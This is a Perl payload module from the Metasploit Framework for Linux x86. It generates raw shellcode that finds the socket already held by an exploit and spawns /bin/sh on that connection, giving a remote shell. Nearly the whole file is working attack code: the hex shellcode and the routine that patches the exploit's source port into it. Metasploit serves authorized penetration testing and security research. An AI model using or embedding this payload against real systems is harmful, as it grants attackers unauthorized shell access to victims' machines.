
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::linux_ia32_findsock;
use strict;
use base 'Msf::PayloadComponent::FindConnection';

my $advanced = { };
my $info =
{
  'Name'         => 'Linux IA32 SrcPort Findsock Shell',
  'Version'      => '$Revision$',
  'Description'  => 'Spawn a shell on the established connection',
  'Authors'      => [ 'vlad902 <vlad902 [at] gmail.com>', ],
  'Arch'         => [ 'x86' ],
  'Priv'         => 0,
  'OS'           => [ 'linux' ],
  'Size'         => '',
  'UserOpts'     =>
    {
      'CPORT' => [1, 'PORT', 'Local port used by exploit'],
    }
};

sub new {
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHashRec($hash, {'Info' => $info, 'Advanced' => $advanced,});
  my $self = $class->SUPER::new($hash, @_);

  $self->_Info->{'Size'} = $self->_GenSize;
  return($self);
}

sub Size {
  my $self = shift;
  my $size = $self->SUPER::Size;
  return($size);
}

sub Build {
  my $self = shift;
  return($self->Generate($self->GetVar('CPORT')));
}

sub Generate {
  my $self = shift;
  my $port = shift;

  my $off_port = 26;
  my $port_bin = pack('n', $port);

  my $shellcode =
    "\x31\xd2\x52\x89\xe5\x6a\x07\x5b\x6a\x10\x54\x55".
    "\x52\x89\xe1\xff\x01\x6a\x66\x58\xcd\x80\x66\x81".
    "\x7d\x02\x11\x5c\x75\xf1\x5b\x6a\x02\x59\xb0\x3f".
    "\xcd\x80\x49\x79\xf9\x52\x68\x2f\x2f\x73\x68\x68".
    "\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b".
    "\xcd\x80";

  substr($shellcode, $off_port, 2, $port_bin);
  return($shellcode);
}

sub _GenSize {
  my $self = shift;
  my $bin = $self->Generate('4444');
  return(length($bin));
}

1;
